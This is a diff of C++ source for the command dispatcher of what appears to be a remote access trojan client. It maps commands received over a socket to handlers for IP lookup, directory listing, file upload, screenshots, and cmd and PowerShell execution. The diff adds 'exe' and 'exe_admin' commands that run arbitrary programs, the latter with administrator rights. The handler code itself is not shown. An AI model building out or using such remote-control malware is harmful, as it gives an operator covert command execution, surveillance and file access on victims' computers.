@@ -34,6 +34,7 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		client->send_b(Auto::get_ip().c_str());
 	}
+	  // ----------------------------------- SYSTEM COMMAND -----------------------------------
 	else if (args[0] == "ls" && args.size() == 1)
 	{
 		Shell::ls(client->getSock());
@@ -42,10 +43,22 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		Shell::pwd(client->getSock());
 	}
-	else if (args[0] == "shell" && args.size() >= 2)
+	else if (args[0] == "cmd" && args.size() >= 2)
 	{
-		Shell::run(client->getSock(), args);
+		Shell::runCMD(client->getSock(), args);
 	}
+	else if (args[0] == "powershell" && args.size() >= 2)
+	{
+		Shell::runPOWERSHELL(client->getSock(), args);
+	}
+	else if (args[0] == "exe" && args.size() == 2)
+	{
+		Shell::exe(client, args[1]);
+	}
+	else if (args[0] == "exe_admin" && args.size() == 2)
+	{
+		Shell::exeAdmin(client, args[1]);
+	}	  // ----------------------------------------TRANSFER ------------------------------------
 	else if (args[0] == "upload" && args.size() == 2)
 	{
 		Transfer::uploadToClient(client, args[1]);
@@ -58,7 +71,6 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		Transfer::screenshot(client);
 	}
-	
 	else
 		client->send_b(("Command " + buffer + " not found").c_str());
 
